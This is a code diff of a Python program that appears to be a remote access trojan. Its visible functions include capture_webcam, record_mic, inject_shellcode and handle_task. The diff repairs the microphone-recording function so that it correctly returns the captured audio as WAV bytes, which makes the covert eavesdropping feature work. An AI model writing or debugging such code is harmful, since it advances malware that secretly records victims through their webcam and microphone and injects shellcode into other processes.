@@ -339,23 +339,36 @@ def capture_webcam():
     _, buf = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
     return buf.tobytes()
 
-def record_mic(seconds=10):
+
+def record_mic(seconds=5, rate=44100, channels=1):
     p = pyaudio.PyAudio()
-    stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
+
+    stream = p.open(
+        format=pyaudio.paInt16,
+        channels=channels,
+        rate=rate,
+        input=True,
+        frames_per_buffer=1024
+    )
+
     frames = []
-    for _ in range(0, int(44100 / 1024 * seconds)):
-        data = stream.read(1024)
-        frames.append(data)
+    for _ in range(int(rate / 1024 * seconds)):
+        frames.append(stream.read(1024, exception_on_overflow=False))
+
     stream.stop_stream()
     stream.close()
     p.terminate()
-    wf = wave.open(io.BytesIO(), 'wb')
-    wf.setnchannels(1)
+
+    # IMPORTANT PART
+    buffer = io.BytesIO()
+    wf = wave.open(buffer, 'wb')
+    wf.setnchannels(channels)
     wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
-    wf.setframerate(44100)
+    wf.setframerate(rate)
     wf.writeframes(b''.join(frames))
-    wf.close()
-    return wf.getvalue()  # WAV bytes
+    wf.close()              # MUST close before reading buffer
+
+    return buffer.getvalue()  
 
 
 def inject_shellcode(pid: int, sc: bytes):
@@ -1423,6 +1436,7 @@ def handle_task(task):
 if __name__ == "__main__":
     import sys
     main()
+
 
 
 
